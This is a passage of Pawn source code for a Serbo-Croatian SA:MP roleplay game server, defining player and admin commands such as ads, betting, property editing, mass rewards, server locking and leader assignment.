	    SendClientMessageToAll(-1, "  > Forum koristimo radi lakseg i brzeg djelovanja u vezi zalbi i slicno.");
	    SendClientMessageToAll(-1, "  > Takodjer na forumu mozete pronaci i zabavni dio kao sto su igre te livechat.");
	    SendClientMessageToAll(-1, "  > Sve o forumu kao i nas domen foruma imate na {4BD1C3}[ /forum ].");
	    SendClientMessageToAll(-1, "====================== {4BD1C3}[ "SERVER_WEB" ] {FFFFFF}=====================");

	    GMChat(ADM_WARN, "[ADMIN] %s je postavi%s reklamu za forum.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"));

	    PlayerInfo[ playerid ][ xAGMStats ] += 4;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

	    KoriscenaReklama = gettime()+600;
	}
	else if(strcmp(vrsta, "teamspeak", true) == 0)
	{
	    SendClientMessageToAll(-1, "======================== {4BD1C3}[ U - TEAMSPEAK ] {FFFFFF}========================");
	    SendClientMessageToAll(-1, "  > Ako vam se svidja nas SA:MP server posjetite i nas Teamspeak server.");
	    SendClientMessageToAll(-1, "  > TeamSpeak3 koristimo radi lakse i brze komunikacije sa igracima.");
	    SendClientMessageToAll(-1, "  > Takodjer na nasem Teamspeak serveru mozete pronaci i sobe za muziku uz 24/7 DJ-a.");
	    SendClientMessageToAll(-1, "  > Sve o TeamSpeaku kao i nas IP TS3 imate na {4BD1C3}[ /teamspeak ].");
	    SendClientMessageToAll(-1, "====================== {4BD1C3}[ "SERVER_WEB" ] {FFFFFF}=====================");

	    GMChat(ADM_WARN, "[ADMIN] %s je postavi%s reklamu za Teamspeak.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"));

	    PlayerInfo[ playerid ][ xAGMStats ] += 4;
	    sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

	    KoriscenaReklama = gettime()+600;
	}
	else SendUsageMessage(playerid, "/reklama [discord/forum/teamspeak]");
	return 1;
}

CMD:zakaci(playerid)
{
	if(!PosaoMehanicarCP[playerid]) return SendErrorMessage(playerid, "Ne radite prevozenje vozila.");
	if(GetPlayerVehicleID(playerid) != PosaoVozilo[playerid]) return SendErrorMessage(playerid, "Niste u vasem vozilu posla.");
	
	new Float:pX, Float:pY, Float:pZ;
	GetPlayerPos(playerid, pX, pY, pZ);

	new Float:vX, Float:vY, Float:vZ,
		Found = 0,
		vid = 0;

	while((vid <= GetVehiclePoolSize()) && (!Found))
	{
		vid++;
		GetVehiclePos(vid, vX, vY, vZ);
		if((floatabs(pX-vX) < 7.0) && (floatabs(pY-vY) < 7.0) && (floatabs(pZ-vZ) < 7.0) && (vid != GetPlayerVehicleID( playerid )) && (vid == PosaoTrailer[playerid]))
		{
			Found = 1;
  			if(!IsTrailerAttachedToVehicle( GetPlayerVehicleID( playerid ) ) )
	  		{
			  	SMG_AttachTrailerToVehicle( vid, GetPlayerVehicleID( playerid ) );
			  	
			  	if(PosaoMehanicarCP[playerid])
			  	{
					SMG_SetPlayerCheckpoint( playerid, 1833.5260,-1411.8934,13.6016, 5.0 );
					CheckpointStatus[ playerid ] = 6;
					OkacioTrailer[playerid] = true;
					SendJobMessage( playerid, "Zakacili ste vozilo, sada ga dostavite na checkpoint." );
				}
			}
    		else SendErrorMessage(playerid, "Vec imate nesto zakaceno.");
		}
	}
	if(!Found) SendErrorMessage(playerid, "Nema vase prikolice/vozila u blizini.");
	return 1;
}

CMD:novagodina( playerid )
{
	#if XMAS_MOD == 1

		if( !IsPlayerInRangeOfPoint( playerid, 2.0, 1504.5527, -1611.0928, 14.0469 ) ) return SendErrorMessage( playerid, "Niste na trgu kod Opstine!" );
		if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage(playerid, "Moras biti lvl 3+!");

		if( PlayerInfo[ playerid ][ xPaketic ] ) return SendErrorMessage(playerid, "Vec si uzeo novogodisnji poklon!");
		PlayerInfo[ playerid ][ xPaketic ] = 1;
		sql_user_update_integer( playerid, "xPaketic", PlayerInfo[ playerid ][ xPaketic ] );

	    DajIgracuNovac( playerid, 500000 );
		PlayerInfo[ playerid ][ xLevel ] += 2;
	    PlayerInfo[ playerid ][ xZlato ] += 1000;

	    SetPlayerScore(playerid, PlayerInfo[playerid][xLevel]);
	  	sql_user_update_integer( playerid, "level", PlayerInfo[ playerid ][ xLevel ] );
	    sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );

	    SendClientMessage( playerid, 0xFF0000FF, "(PRAZNICI): Otvorili ste novogodisnji paketic. | Nagrada: {FFFFFF}$500.000 {FF0000}| {FFFFFF}2xLevelUP {FF0000}| {FFFFFF}Zlato - 1000g");

	#else

		SendErrorMessage( playerid, "Nije XMAS period.");

	#endif
	return 1;
}

CMD:carstats(playerid)
{
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    format( globalstring, sizeof( globalstring ), "{4282C0}- Vozila [slotovi: {FFFFFF}(%d/%d){4282C0}]:\n", PlayerInfo[ playerid ][ xSlotoviVozila ], MAX_VEH_SLOT );
	strcat( DialogStrgEx, globalstring );

	new str[MAX_VEH_SLOT * 200];
	for( new j = 0; j < MAX_VEH_SLOT; j ++ )
	{
 		if( (j+1) <= PlayerInfo[ playerid ][ xSlotoviVozila ] )
		{
			if( player_veh[ playerid ][ vehicle_id ][ j ] != -1 )
			{
				format( str, sizeof( str ), "{4282C0}* Slot{FFFFFF}(%d) {4282C0}| Model: {FFFFFF}(%s) {4282C0}| InGame ID: {FFFFFF}(%d) {4282C0}| SQL ID: {FFFFFF}(%d)\n",
								j+1,
								getVehicleName( player_veh[ playerid ][ vehicle_id ][ j ] ),
								player_veh[ playerid ][ vehicle_id ][ j ],
								VehicleInfo[ player_veh[ playerid ][ vehicle_id ][ j ] ][ vSqlID ] );
				strcat( DialogStrgEx, str );
			}
			else
			{
			    format( globalstring, sizeof( globalstring ), "{4282C0}* Slot{FFFFFF}(%d) {4282C0}| PRAZNO\n", j+1 );
		        strcat( DialogStrgEx, globalstring );
			}
		}
	}

	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Vozila:", DialogStrgEx, "Zatvori", "");
 	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	return 1;
}

CMD:kladionica( playerid, const params[] )
{
	if( uFirmi[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u kladionici." );
    if( BusinessInfo[ uFirmi[ playerid ] ][ bType ] != VRSTA_KLAD ) return SendErrorMessage( playerid, "Morate biti u kladionici." );
    if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Nisi level 5+." );
    if( Kockanje[playerid][IgraKlad] ) return SendErrorMessage(playerid, "Vec ste igrali na neki tim, sacekajte da zavrsi mec." );

    new kladnovac, kladtim;
   	if( sscanf(params, "ii", kladnovac, kladtim)) return SendUsageMessage(playerid, "/kladionica (novac) (1. czvezda / 2. nereseno / 3. partizan)");
    if( kladnovac < 1000 || kladnovac > 10000 ) return SendErrorMessage( playerid, "Minimalni ulog je $1000, a maksimalni $10.000.");
    if( PlayerInfo[ playerid ][ xNovac ] < kladnovac ) return SendErrorMessage( playerid, "Nemate dovoljno novca!");
    if(kladtim != 1 && kladtim != 2 && kladtim != 3) return SendErrorMessage(playerid, "Tim moze biti samo czvezda ili partizan ili nereseno.");

	switch(kladtim)
	{
		case 1:
		{
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s stavlja $%d na Crvenu Zvezdu.", ImeIgraca( playerid ), kladnovac );
			SCMF(playerid, 0x72B8D8FF, "(KLADIONICA): Stavili ste {FFFFFF}($%d) {82B8D8}na {FFFFFF}'Crvenu Zvezdu'. {72B8D8}Sacekajte da zavrsi mec.", kladnovac);
		}
		case 2:
		{
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s stavlja $%d na nereseno.", ImeIgraca( playerid ), kladnovac );
			SCMF(playerid, 0x72B8D8FF, "(KLADIONICA): Stavili ste {FFFFFF}($%d) {82B8D8}na {FFFFFF}'NERESENO'. {72B8D8}Sacekajte da zavrsi mec.", kladnovac);
		}
		case 3:
		{
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s stavlja $%d na Partizan.", ImeIgraca( playerid ), kladnovac );
			SCMF(playerid, 0x72B8D8FF, "(KLADIONICA): Stavili ste {FFFFFF}($%d) {82B8D8}na {FFFFFF}'Partizan'. {72B8D8}Sacekajte da zavrsi mec.", kladnovac);
		}
	}

    DajIgracuNovac( playerid, -kladnovac );
    BussinesMoney( uFirmi[ playerid ], kladnovac, true);

    Kockanje[playerid][IgraKlad] = true;
	Kockanje[playerid][TimKlad] = kladtim;
	Kockanje[playerid][UlogKlad] = kladnovac;
    return 1;
}

CMD:adresa( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
	//if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

    new adresa[ 38 ];
    if( sscanf( params, "s[38]", adresa ) ) return SendUsageMessage( playerid, "/adresa [nova adresa]");

    new im = GetNearestProperty( playerid );
	if( GetNearestProperty( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema imovine u vasoj blizini." );
	if( strlen( params ) > 38 ) return SendErrorMessage( playerid, "Adresa ne moze biti duza od 38 karaktera." );

	strmid( II[ im ][ iAdress ], adresa, 0, strlen( adresa ), 32);
	SaveProperty( im );
	PropertyRefresh( im );
    return 1;
}

CMD:neaktivnost( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

	new izbor, id;
	if( sscanf( params, "ii", izbor, id ) )
	{
		SendUsageMessage( playerid, "/neaktivnost [izbor] [id]");
		SendClientMessage( playerid, -1, "[Izbor] 1. imovina | 2. firma");
		return 1;
	}

	if( izbor == 1 )
	{
		if( II[id][iSQLID] == 0 ) return SendErrorMessage( playerid, "Ta imovina(ID) ne postoji u bazi podataka!");
	    SendInfoMessage( playerid, "Neaktivnost imovine ID - %d je %dh.", id, II[ id ][ iNeaktivnost ] );
	}
	else if( izbor == 2 )
	{
		if( BusinessInfo[ id ][ b_ID ] == 0 ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");
	    SendInfoMessage( playerid, "Neaktivnost firme ID - %d je %dh.", id, BusinessInfo[ id ][ bNeaktivnost ] );
	}
	else return SendErrorMessage( playerid, "Pogresan izbor (1|2)." );
	return 1;
}

CMD:edit( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	new vrsta, izbor, kolicina;

    if( sscanf( params, "iii", vrsta, izbor, kolicina ) )
	{
		SendUsageMessage( playerid, "/edit [izbor 1] [izbor 2] [kolicina]");
		SendClientMessage( playerid, -1, "[Izbor 1] 1. imovina | 2. firma");
		SendClientMessage( playerid, -1, "[Izbor 2] 1. level | 2. cena ");
		return 1;
	}

	if( vrsta == 1 )
	{
	    new id = GetNearestProperty( playerid );
	    if( GetNearestProperty( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema imovine u vasoj blizini!" );
		if( izbor == 1 )
		{
		    II[ id ][ iLevel ] = kolicina;
			PropertyRefresh( id );
			SaveProperty( id );

			SCMF( playerid, 0x4282C0FF, "#EDIT: {FFFFFF}Izmenili ste level imovine {4282C0}(%d) {FFFFFF}u {4282C0}(%d).", id, II[ id ][ iLevel ] );

			WriteLog("log-edit", "Admin %s je izmenio level na imovini ID %d u %d", ImeIgraca( playerid ), id, kolicina);
		}
		else if( izbor == 2 )
		{
		    II[ id ][ iPrice ] = kolicina;
			PropertyRefresh( id );
			SaveProperty( id );

			SCMF( playerid, 0x4282C0FF, "#EDIT: {FFFFFF}Izmenili ste cijenu imovine {4282C0}(%d) {FFFFFF}u {4282C0}(%d).", id, II[ id ][ iPrice ] );

			WriteLog("log-edit", "Admin %s je izmenio cijenu na imovini ID %d u %d", ImeIgraca( playerid ), id, kolicina);
		}
		else return SendErrorMessage( playerid, "Pogresan izbor levela ili cijene." );
	}
	else if( vrsta == 2 )
	{
	    new id = GetNearestBussines( playerid );
	    if( GetNearestBussines( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema firme u vasoj blizini!" );
		if( izbor == 1 )
		{
		    BusinessInfo[ id ][ bLevel ] = kolicina;
			Bussines_Refresh( id );
			sql_bussines_update_integer( id, "b_level", BusinessInfo[ id ][ bLevel ] );

			SCMF( playerid, 0x4282C0FF, "#EDIT: {FFFFFF}Izmenili ste level firme {4282C0}(%d) {FFFFFF}u {4282C0}(%d).", id, BusinessInfo[ id ][ bLevel ] );

			WriteLog("log-edit", "Admin %s je izmenio level na firmi ID %d u %d", ImeIgraca( playerid ), id, kolicina);
		}
		else if( izbor == 2 )
		{
		    BusinessInfo[ id ][ bPrice ] = kolicina;
			Bussines_Refresh( id );
			sql_bussines_update_integer( id, "b_price", BusinessInfo[ id ][ bPrice ] );

			SCMF( playerid, 0x4282C0FF, "#EDIT: {FFFFFF}Izmenili ste cenu firme {4282C0}(%d) {FFFFFF}u {4282C0}(%d).", id, BusinessInfo[ id ][ bPrice ] );

			WriteLog("log-edit", "Admin %s je izmenio cenu na firmi ID %d u %d", ImeIgraca( playerid ), id, kolicina);
		}
		else return SendErrorMessage( playerid, "Pogresan izbor levela ili cijene." );
	}
	else return SendErrorMessage( playerid, "Pogresan izbor firme ili imovine." );
	return 1;
}

CMD:dajsvima( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 )
	{
		if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
		//if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );

		new vrsta, kolicina;
		if( sscanf( params, "ii", vrsta, kolicina ) )
		{
			SendUsageMessage( playerid, "/dajsvima [vrsta] [kolicina]");
			SendClientMessage( playerid, -1, "[Vrsta] 1. Level | 2. Novac | 3. Respekt");
			return 1;
		}
		if( vrsta < 1 || vrsta > 3 ) return SendErrorMessage( playerid, "Vrsta ne moze biti ispod 1 i preko 3." );

		if( vrsta == 1 )
		{
			if(kolicina < 1 || kolicina > 2) return SendErrorMessage(playerid, "Ne moze preko 2 levela odjednom ili ispod 1 levela.");

		    foreach( new i : Player)
			{
		        if( i != IPI && PlayerLogged[ i ] != false )
				{
		            PlayerInfo[ i ][ xLevel ] += kolicina;
		            SetPlayerScore( i, PlayerInfo[ i ][ xLevel ] );
		            sql_user_update_integer( i, "level", PlayerInfo[ i ][ xLevel ] );
		        }
		    }

			SendInfoMessage( playerid, "Dao si svim igracima %d x LevelUP.", kolicina );
		    SendClientMessageToAllEx( 0x4282C0FF, "#NAGRADE: {FFFFFF}Vlasnik {4282C0}%s {FFFFFF}je nagradio sve igrace sa {4282C0}(%d) {FFFFFF}x LevelUP.", ImeIgraca( playerid ), kolicina );
		    return 1;
		}
		else if( vrsta == 2 )
		{
			if(kolicina > 100000) return SendErrorMessage(playerid, "Ne moze preko 100.000$ odjednom.");

		    foreach( new i : Player)
			{
		        if( i != IPI && PlayerLogged[ i ] != false )
				{
		            DajIgracuNovac( i, kolicina );
		        }
		    }

		    SendInfoMessage( playerid, "Dao si svim igracima (%d).", kolicina);
		    SendClientMessageToAllEx( 0x4282C0FF, "#NAGRADE: {FFFFFF}Vlasnik {4282C0}%s {FFFFFF}je nagradio sve igrace sa {4282C0}($%d).", ImeIgraca( playerid ), kolicina );
		    return 1;
		}
		else if( vrsta == 3 )
		{
			if(kolicina > 2) return SendErrorMessage(playerid, "Ne moze preko 2xp odjednom.");

		    foreach( new i : Player)
			{
		        if( i != IPI && PlayerLogged[ i ] != false )
				{
		            PlayerInfo[ i ][ xRespekt ] += kolicina;

		            new nxtlevel = PlayerInfo[ i ][ xLevel ]+1, expamount = nxtlevel*levelexp;
					if( PlayerInfo[ i ][ xRespekt ] >= expamount )
					{
						format( globalstring, sizeof( globalstring ), "~g~LEVEL UP~n~~w~Sada si Level %d", nxtlevel );
						GameTextForPlayer( i, globalstring, 5000, 1);
						PlayerPlaySound( i, 1052, 0.0, 0.0, 0.0);
						PlayerPlayMusic( i );
						PlayerInfo[ i ][ xLevel ]++;
						SetPlayerScore( i, PlayerInfo[ i ][ xLevel ] );
						PlayerInfo[ i ][ xPoboljsanja ] += 2;
			            PlayerInfo[ i ][ xRespekt ] = 0;
						SCMF( i, 0x33CCFFFF, "(LEVELUP): Sada si level {FFFFFF}(%d) {33CCFF}kucaj {FFFFFF}[ /upgrade ] {33CCFF}za neke bonuse.", nxtlevel );
						SCMF( i, 0x33CCFFFF, "(LEVELUP): Imas {FFFFFF}(%d) {33CCFF}neiskoristenih upgrade poena.", PlayerInfo[ i ][ xPoboljsanja ]);

	                    new q[ 120 ];
						mysql_format( mSQL, q, sizeof(q),
							"UPDATE `users` SET `level` = '%d', `exp` = '%d', `upgrades` = '%d' WHERE `user_id` = '%d' LIMIT 1",
								PlayerInfo[ i ][ xLevel ], PlayerInfo[ i ][ xRespekt ], PlayerInfo[ i ][ xPoboljsanja ], PlayerInfo[ i ][ xID ] );

						mysql_tquery( mSQL, q );

						if( PlayerInfo[ i ][ xLevel ] == 5 || PlayerInfo[ i ][ xLevel ] == 10 )
						{
						    if( PlayerInfo[ i ][ xSlotoviVozila ] < MAX_VEH_SLOT )
							{
								PlayerInfo[ i ][ xSlotoviVozila ]++;
								SCMF( i, ZUTA, "(VOZILO): Dobili ste dodatni slot vozila jer ste presli level {FFFFFF}(%d). {FFFF00}Sada imate {FFFFFF}(%d).", PlayerInfo[ i ][ xLevel ], PlayerInfo[ i ][ xSlotoviVozila ] );

								sql_user_update_integer( i, "vehicle_slots", PlayerInfo[ i ][ xSlotoviVozila ] );
							}
						}
					}
					else
					{
						sql_user_update_integer( i, "exp", PlayerInfo[ i ][ xRespekt ] );
					}
		        }
		    }

		    SendInfoMessage( playerid, "Dao si svim igracima %d x XP.", kolicina);
		    SendClientMessageToAllEx( 0x4282C0FF, "#NAGRADE: {FFFFFF}Vlasnik {4282C0}%s {FFFFFF}je nagradio sve igrace sa {4282C0}(%d) {FFFFFF}x XP.", ImeIgraca( playerid ), kolicina );
		    return 1;
		}
		else SendErrorMessage( playerid, "Pogresna vrsta(1-3)." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return 1;
}

CMD:kupivozilo( playerid )
{
	if(!as_Buying[playerid])
	{
		if(!IsPlayerInRangeOfPoint(playerid, 3.0, 543.1198,-1293.8124,17.2910) ) return SendErrorMessage( playerid, "Nisi na pickupu auto salona." );
		if(PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Morate biti level 5+." );
	    if(!ServerInfo[ KupovinaVozila ]) return SendErrorMessage( playerid, "Trenutno nije moguce kupovanje vozila." );
	    if(PlayerInfo[ playerid ][ xWanted ] > 0 ) return SendErrorMessage( playerid, "Ne mozes kupovati kad imas Wanted Level." );

	    new slot = -1;
	    for( new j = 0; j < MAX_VEH_SLOT; j ++ )
		{
			if( (j+1) <= PlayerInfo[ playerid ][ xSlotoviVozila ] && player_veh[ playerid ][ vehicle_id ][ j ] == -1 )
			{
		  		slot = j;
				break;
			}
		}
		if( slot == -1 ) return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );

	    as_Buying[ playerid ] = true;
	    as_Model[ playerid ] = 0;

		ControlTextDrawVehBuy( playerid, true );
	    TogPlayerHud( playerid );

	    SMG_TogglePlayerControllable( playerid, false );
	}
	else
	{
		as_Buying[playerid] = false;
		ControlTextDrawVehBuy(playerid, false);
		TogPlayerHud(playerid);
		SMG_TogglePlayerControllable(playerid, true);
	}
	return 1;
}

CMD:servername( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

    new server_name[ 90 ];
	if( sscanf( params, "s[90]", server_name ) ) return SendUsageMessage( playerid, "/servername [naziv]");

	format( server_name, sizeof( server_name ), "hostname %s", server_name );
	SendRconCommand( server_name );

	SendInfoMessage( playerid, "%s", server_name );
	return 1;
}

CMD:maintenancemode( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );

	foreach(new i : Player) SMG_TogglePlayerControllable( i, false );

	GameTextForAll( "Napustite server zbog updatea!", 15000, 3 );
	SendRconCommand( "hostname [U] U L T I M A T E >> Maintenance" );
	SendRconCommand( "password SMG_main" );
	return 1;
}

CMD:lockserver(playerid, const params[])
{
	if(PlayerInfo[playerid][xAdmin] != 7 || !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid, "Niste ovlasceni.");

	new pw[20];
	if(sscanf(params, "s[20]", pw)) return SendUsageMessage(playerid, "/lockserver [pw/unlock]");
	if(strlen(pw) > 20) return SendErrorMessage(playerid, "Ne mozete preko 20 karaktera za lozinku.");

	new str[144];
	if(strfind(pw, "unlock", true) != -1)
	{
		SendRconCommand("password 0");

		SendClientMessage(playerid, -1, "* Uklonili ste server password i otkljucali server."); 
		AdminMsg(ADM_WARN, "[ADMIN] %s je otkljuca%s server.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"));
	}
	else
	{
		format(str, 30, "password %s", pw);
		SendRconCommand(str);

		SCMF(playerid, -1, "* Postavili ste password na %s i zakljucali server.", pw);
		AdminMsg(ADM_WARN, "[ADMIN] %s je zakljuca%s server, password: %s", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), pw);
	}
	return 1;
}

CMD:unprisonall( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7 )
	{
		foreach( new i : Player)
		{
			if( PlayerInfo[ i ][ xZatvor ] != 0 )
			{
				SMG_SetPlayerPos( i, 1536.2214,-1663.0848,13.5469 );
			   	SetPlayerTimerEx(i, "SlobodnoSada", 2000, false, "i", i);
			   	SetCameraBehindPlayer( i );
			    SMG_TogglePlayerControllable( i, false );
			  	SetPlayerInterior( i, 0 );
				SetPlayerVirtualWorld( i, 0 );
				SetPlayerWorldBounds( i, 20000.0000, -20000.0000, 20000.0000, -20000.0000 );

			    PlayerInfo[ i ][ xZatvor ] = 0;
				PlayerInfo[ i ][ xZatvorVreme ] = 0;
			}
		}

	   	SendClientMessageToAllEx( ADM_WARN, "[ADMIN] %s je unprisonovao sve igrace.", ImeIgraca( playerid ) );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:kickall( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7)
	{
		foreach( new i : Player)
		{
			if( PlayerInfo[ i ][ xAdmin ] < 1 ) SetPlayerTimerEx(i, "KickIgraca", 50, false, "i", i);
		} 
	   	AdminMsg( ADM_WARN, "[ADMIN] %s je kikov%s sve igrace.", ImeIgraca( playerid ), getPolForString(playerid, "ao", "la") );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:id( playerid, const params[] )
{
    new target;
	if( sscanf( params, "u", target ) )
	{
		SendUsageMessage( playerid, "/id [nickname]");
		return 1;
	}
	if( IsPlayerConnected( target ) )
	{
 		if( target != IPI )
 		{
			SCMF( playerid, -1, "ID(%d): %s", target, ImeIgraca( target ) );
		}
	}
    return 1;
}

CMD:makeleader( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4 )
	{
		new id, kolicina;
	    if( sscanf( params, "ui", id, kolicina ) )
		{
			SendUsageMessage( playerid, "/makeleader [id] [org]" );
			SendClientMessage( playerid, -1, "Listu organizacija gledate komandom [ /server > Spisak organizacija ] ili [ /lideri ]." );
			return 1;
		}

		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	    if( kolicina == 0 )
		{
			if( PlayerInfo[ id ][ xLider ] == 0 ) return SendErrorMessage( playerid, "Taj igrac nije lider nijedne organizacije" );
			new OrgID = PlayerInfo[ id ][ xLider ];

	        for( new i = 0; i < 52; i++ )
			{
				if( strcmp( ImeIgraca( id ), org_members_info[ OrgID ][ i ][ o_m_Name ], true ) == 0 )
				{
				    strmid( org_members_info[ OrgID ][ i ][ o_m_Name ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
				    org_members_info[ OrgID ][ i ][ o_m_sqlID ] = 0;
				    org_members_info[ OrgID ][ i ][ o_m_type ] = 0;
				    break;
				}
			}

            sql_org_member_delete( org_info[ OrgID ][ oID ], PlayerInfo[ id ][ xID ] );

			PlayerInfo[ id ][ xLider ] = 0;
			PlayerInfo[ id ][ xRank ] = 0;
			PlayerInfo[ id ][ xClan ] = 0;
			PlayerInfo[ id ][ xOrgUgovor ] = 0;
			PlayerInfo[ id ][ xSkin ] = SetSexSkin( id );
			PlayerInfo[ id ][ xSpawn ] = SetRandomSpawn( id );
			SMG_SetPlayerSkin( id, SetSexSkin( id ) );
            sql_user_update_org_variables( id );
			SCMF( id, 0x33CCFFFF, "#LIDER: {FFFFFF}%s {33CCFF}%s {FFFFFF}vam je skinuo lidera.", getAdminRankName( playerid ), ImeIgraca( playerid ) );
 
		   	AdminMsg( ADM_WARN, "[ADMIN] %s je skinu%s lidera igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );

		   	WriteLog("log-make", "Admin %s | Igrac: %s | Skidanje lidera", ImeIgraca( playerid ), ImeIgraca( id ) );
		}
		else
		{
			if( PlayerInfo[ id ][ xClan ] != 0 ) return SendErrorMessage( playerid, "Taj igrac je vec clan neke organizacije" );
			if( PlayerInfo[ id ][ xLider ] != 0 ) return SendErrorMessage( playerid, "Taj igrac je vec clan neke organizacije" );
		    if( kolicina < 1 || org_info[ kolicina ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );

            if( org_info[ kolicina ][ oSuspended ] ) return SendErrorMessage( playerid, "Ova organizacija je zakljucana od strane vlasnika." );

            if(PlayerInfo[id][xAdmin] >= 1 && PlayerInfo[id][xAdmin] <= 4) return SendErrorMessage(playerid, "Admini 1-4 ne mogu biti lideri.");

			new c_l = 0;
		    for( new i = 0; i < 52; i++ )
			{
				if( org_members_info[ kolicina ][ i ][ o_m_type ] == 1 ) c_l++;
			}
			if( c_l >= 2 ) SendErrorMessage( playerid, "Ova organizacija vec ima dva lidera." );

			new slot_id = -1;
            for( new i = 0; i < 52; i++ )
			{
            	if( strcmp( "Niko", org_members_info[ kolicina ][ i ][ o_m_Name ], true ) == 0 )
				{
					slot_id = i;
					break;
				}
			}
            if( slot_id == -1 ) return SendErrorMessage( playerid, "Ova organizacija vec ima dva lidera." );

            strmid( org_members_info[ kolicina ][ slot_id ][ o_m_Name ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), MAX_PLAYER_NAME  );
			org_members_info[ kolicina ][ slot_id ][ o_m_sqlID ] = PlayerInfo[ id ][ xID ];
			org_members_info[ kolicina ][ slot_id ][ o_m_type ] = 1;

			PlayerInfo[ id ][ xLider ] = kolicina;
			PlayerInfo[ id ][ xClan ] = kolicina;
			PlayerInfo[ id ][ xOrgUgovor ] = 0;
			PlayerInfo[ id ][ xSpawn ] = SPAWN_BAZA;
			PlayerInfo[ id ][ xRank ] = 6;

			if( PlayerInfo[ id ][ xPol ] == 1 ) PlayerInfo[ id ][ xSkin ] = org_info[ kolicina ][ oSkin6 ], SMG_SetPlayerSkin( id, org_info[ kolicina ][ oSkin6 ] );
			else if( PlayerInfo[ id ][ xPol ] == 2 ) PlayerInfo[ id ][ xSkin ] = org_info[ kolicina ][ oZSkin6 ], SMG_SetPlayerSkin( id, org_info[ kolicina ][ oZSkin6 ] );

			SCMF( id, 0x33CCFFFF, "#LIDER: {FFFFFF}%s {33CCFF}%s {FFFFFF}vam je postavio poziciju lidera {33CCFF}%s.", getAdminRankName( playerid ), ImeIgraca( playerid ), org_info[ kolicina ][ oName ] );

            sql_org_member_inser( org_info[ kolicina ][ oID ], 1, id );
            sql_user_update_org_variables( id ); 

		   	AdminMsg( ADM_WARN, "[ADMIN] %s je postavi%s poziciju lidera %s igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), org_info[ kolicina ][ oName ], ImeIgraca( id ) );

		   	WriteLog("log-make", "Admin %s | Igrac: %s | Organizacija: %s", ImeIgraca( playerid ), ImeIgraca( id ), org_info[ kolicina ][ oName ]);
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return 1;
}

CMD:tunecar( playerid )
{
    if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240)) return SendErrorMessage(playerid, "Ne mozete /tunecar na ovoj poziciji.");
	if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xVIPLevel ] >= 3 )
	{
	    if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 )
		{
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes fixati vozilo dok imas wanted level." );
		}
